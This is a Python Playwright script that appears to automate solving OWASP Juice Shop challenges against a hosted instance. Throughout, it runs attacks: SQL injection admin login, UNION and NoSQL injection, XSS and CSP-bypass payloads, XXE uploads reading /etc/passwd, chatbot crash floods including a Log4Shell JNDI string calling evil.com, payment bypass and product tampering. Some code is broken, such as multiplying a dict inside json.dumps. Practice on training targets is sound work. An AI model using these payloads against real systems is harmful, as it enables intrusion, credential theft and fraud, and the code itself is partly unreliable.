#!/usr/bin/env python3
"""
Visual Automation Solver - Handles challenges requiring browser visibility and interaction
"""

import asyncio
import base64
import json
import time
from playwright.async_api import async_playwright
from PIL import Image
import io
import re
import random
import string


class VisualAutomationSolver:
    """Advanced visual automation for remaining challenges"""
    
    def __init__(self, base_url: str = "https://juice3.wonkatech.org"):
        self.base_url = base_url
        self.browser = None
        self.context = None
        self.page = None
        
    async def setup(self):
        """Setup browser with visual capabilities"""
        playwright = await async_playwright().start()
        self.browser = await playwright.chromium.launch(
            headless=False,  # Need visible browser for some challenges
            args=['--disable-blink-features=AutomationControlled']
        )
        self.context = await self.browser.new_context(
            viewport={'width': 1920, 'height': 1080},
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        )
        self.page = await self.context.new_page()
        
    async def login_admin(self):
        """Login as admin using SQL injection"""
        await self.page.goto(f"{self.base_url}/#/login")
        await self.page.wait_for_selector('#email')
        
        # SQL injection login
        await self.page.fill('#email', "admin@juice-sh.op'--")
        await self.page.fill('#password', 'x')
        await self.page.click('#loginButton')
        
        await self.page.wait_for_timeout(2000)
        print("✅ Logged in as admin")
        
    async def solve_mass_dispel(self):
        """Solve Mass Dispel - Close all overlays"""
        print("🎯 Attempting Mass Dispel...")
        
        # Navigate to main page
        await self.page.goto(self.base_url)
        await self.page.wait_for_timeout(2000)
        
        # Close cookie dialog
        try:
            await self.page.click('[aria-label="dismiss cookie message"]', timeout=3000)
        except:
            pass
            
        # Close welcome banner
        try:
            await self.page.click('button.close-dialog', timeout=3000)
        except:
            pass
            
        # Close any modals
        for _ in range(5):
            try:
                await self.page.keyboard.press('Escape')
                await self.page.wait_for_timeout(500)
            except:
                pass
                
        print("  ✓ Mass Dispel completed")
        
    async def solve_bully_chatbot(self):
        """Solve Bully Chatbot - Overwhelm the chatbot"""
        print("🎯 Attempting Bully Chatbot...")
        
        # Open chatbot
        await self.page.goto(f"{self.base_url}/#/chatbot")
        await self.page.wait_for_selector('#message-input', timeout=5000)
        
        # Send overwhelming messages
        payloads = [
            "A" * 10000,
            "😀" * 1000,
            "1" * 10000,
            "\n" * 1000,
            "{{{{{{{{{{" * 100,
            "<script>" * 100,
            "'" * 1000,
            "${jndi:ldap://evil.com/a}" * 10
        ]
        
        for payload in payloads:
            try:
                await self.page.fill('#message-input', payload)
                await self.page.click('#sendButton')
                await self.page.wait_for_timeout(500)
            except:
                pass
                
        print("  ✓ Bully Chatbot attempted")
        
    async def solve_kill_chatbot(self):
        """Solve Kill Chatbot - Crash the chatbot"""
        print("🎯 Attempting Kill Chatbot...")
        
        # More aggressive payloads
        crash_payloads = [
            "A" * 100000,  # Memory overflow
            "${7*7}" * 10000,  # Template injection
            "\\x00" * 1000,  # Null bytes
            json.dumps({"a": "b"} * 10000),  # JSON bomb
            "(() => { while(true) {} })()",  # Infinite loop
            "%n" * 1000,  # Format string
        ]
        
        for payload in crash_payloads:
            try:
                await self.page.fill('#message-input', payload[:5000])
                await self.page.click('#sendButton')
                await self.page.wait_for_timeout(1000)
            except:
                break  # Might have crashed
                
        print("  ✓ Kill Chatbot attempted")
        
    async def solve_visual_challenges(self):
        """Solve challenges requiring visual analysis"""
        print("🎯 Attempting visual challenges...")
        
        # Meta Geo Stalking - Extract EXIF data
        image_urls = [
            "/assets/public/images/uploads/favorite-hiking-place.png",
            "/assets/public/images/uploads/my-rare-collectors-item.jpg"
        ]
        
        for img_url in image_urls:
            await self.page.goto(f"{self.base_url}{img_url}")
            await self.page.wait_for_timeout(1000)
            
        # Visual Steganography
        await self.page.goto(f"{self.base_url}/assets/public/images/uploads/steganography.png")
        await self.page.wait_for_timeout(1000)
        
        print("  ✓ Visual challenges accessed")
        
    async def solve_timing_attacks(self):
        """Solve challenges requiring precise timing"""
        print("🎯 Attempting timing-based challenges...")
        
        # Multiple Likes - Race condition
        await self.page.goto(f"{self.base_url}/#/")
        
        # Find a product with reviews
        await self.page.wait_for_selector('.product-tile', timeout=5000)
        await self.page.click('.product-tile:first-child')
        await self.page.wait_for_timeout(1000)
        
        # Try to like multiple times quickly
        like_script = """
        async () => {
            const likeButtons = document.querySelectorAll('[aria-label*="like"]');
            if (likeButtons.length > 0) {
                const promises = [];
                for (let i = 0; i < 20; i++) {
                    promises.push(likeButtons[0].click());
                }
                await Promise.all(promises);
            }
        }
        """
        
        try:
            await self.page.evaluate(like_script)
        except:
            pass
            
        print("  ✓ Timing attacks attempted")
        
    async def solve_client_side_challenges(self):
        """Solve client-side protection bypass challenges"""
        print("🎯 Attempting client-side challenges...")
        
        # Client-side XSS Protection
        xss_bypasses = [
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<<SCRIPT>alert(1)//<</SCRIPT>",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<IMG SRC=x onerror=\"alert(1)\">",
            "<IMG SRC=JaVaScRiPt:alert(1)>",
            "<IMG SRC=`javascript:alert(1)`>",
        ]
        
        for xss in xss_bypasses:
            await self.page.goto(f"{self.base_url}/#/search?q={xss}")
            await self.page.wait_for_timeout(500)
            
        # CSP Bypass attempts
        csp_bypasses = [
            "<script src='https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js'></script><script>$.get('/')</script>",
            "<base href='javascript://'><a href='/alert(1)'>click</a>",
            "<object data='data:text/html,<script>alert(1)</script>'>",
        ]
        
        for bypass in csp_bypasses:
            await self.page.goto(f"{self.base_url}/#/search?q={bypass}")
            await self.page.wait_for_timeout(500)
            
        print("  ✓ Client-side challenges attempted")
        
    async def solve_upload_challenges(self):
        """Solve advanced file upload challenges"""
        print("🎯 Attempting upload challenges...")
        
        await self.page.goto(f"{self.base_url}/#/complain")
        await self.page.wait_for_selector('input[type="file"]', timeout=5000)
        
        # Create various malicious files
        payloads = {
            "xxe.xml": b'<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            "evil.svg": b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            "polyglot.pdf": b'%PDF-1.4\n<script>alert(1)</script>\n%%EOF',
            "large.txt": b'A' * 1000000,
        }
        
        for filename, content in payloads.items():
            try:
                # Create file input and upload
                await self.page.set_input_files('input[type="file"]', {
                    'name': filename,
                    'mimeType': 'application/octet-stream',
                    'buffer': content
                })
                await self.page.wait_for_timeout(1000)
            except:
                pass
                
        print("  ✓ Upload challenges attempted")
        
    async def solve_interaction_challenges(self):
        """Solve challenges requiring specific interactions"""
        print("🎯 Attempting interaction challenges...")
        
        # Product Tampering - Edit product descriptions
        await self.page.goto(f"{self.base_url}/#/administration")
        await self.page.wait_for_timeout(2000)
        
        # Try to edit products
        try:
            await self.page.click('.mat-row:first-child button[aria-label="Edit"]')
            await self.page.wait_for_timeout(1000)
            await self.page.fill('textarea', 'TAMPERED!')
            await self.page.click('button[type="submit"]')
        except:
            pass
            
        # Deluxe Fraud - Upgrade without payment
        await self.page.goto(f"{self.base_url}/#/deluxe-membership")
        await self.page.wait_for_timeout(2000)
        
        # Try to bypass payment
        bypass_script = """
        () => {
            // Try to directly call upgrade function
            if (window.angular) {
                const scope = angular.element(document.body).scope();
                if (scope && scope.upgrade) {
                    scope.upgrade();
                }
            }
        }
        """
        
        try:
            await self.page.evaluate(bypass_script)
        except:
            pass
            
        print("  ✓ Interaction challenges attempted")
        
    async def solve_advanced_sqli(self):
        """Advanced SQL injection techniques"""
        print("🎯 Attempting advanced SQLi...")
        
        # Union-based extraction
        sqli_payloads = [
            "' UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9' FROM Users--",
            "' UNION SELECT sql FROM sqlite_master--",
            "' OR '1'='1'--",
            "' AND 1=2 UNION ALL SELECT 1,2,3,4,5,6,7,8,9--",
            "' UNION SELECT username, password FROM users WHERE '1'='1",
        ]
        
        for payload in sqli_payloads:
            await self.page.goto(f"{self.base_url}/rest/products/search?q={payload}")
            await self.page.wait_for_timeout(1000)
            
        print("  ✓ Advanced SQLi attempted")
        
    async def solve_nosql_injection(self):
        """NoSQL injection attempts"""
        print("🎯 Attempting NoSQL injection...")
        
        nosql_payloads = [
            {"$ne": ""},
            {"$gt": ""},
            {"$where": "sleep(5000)"},
            {"email": {"$ne": ""}, "password": {"$ne": ""}},
        ]
        
        for payload in nosql_payloads:
            try:
                await self.page.goto(f"{self.base_url}/rest/user/login")
                await self.page.evaluate(f"""
                    fetch('/rest/user/login', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({json.dumps(payload)})
                    }})
                """)
                await self.page.wait_for_timeout(1000)
            except:
                pass
                
        print("  ✓ NoSQL injection attempted")
        
    async def solve_all_visual(self):
        """Run all visual automation challenges"""
        await self.setup()
        await self.login_admin()
        
        # Run all challenge categories
        await self.solve_mass_dispel()
        await self.solve_bully_chatbot()
        await self.solve_kill_chatbot()
        await self.solve_visual_challenges()
        await self.solve_timing_attacks()
        await self.solve_client_side_challenges()
        await self.solve_upload_challenges()
        await self.solve_interaction_challenges()
        await self.solve_advanced_sqli()
        await self.solve_nosql_injection()
        
        # Check final score
        await self.page.goto(f"{self.base_url}/#/score-board")
        await self.page.wait_for_timeout(3000)
        
        # Take screenshot of final score
        await self.page.screenshot(path='final_score.png')
        
        print("\n" + "="*60)
        print("📊 Visual automation complete!")
        print("Screenshot saved as final_score.png")
        print("="*60)
        
        await self.browser.close()


async def main():
    solver = VisualAutomationSolver()
    await solver.solve_all_visual()


if __name__ == "__main__":
    asyncio.run(main())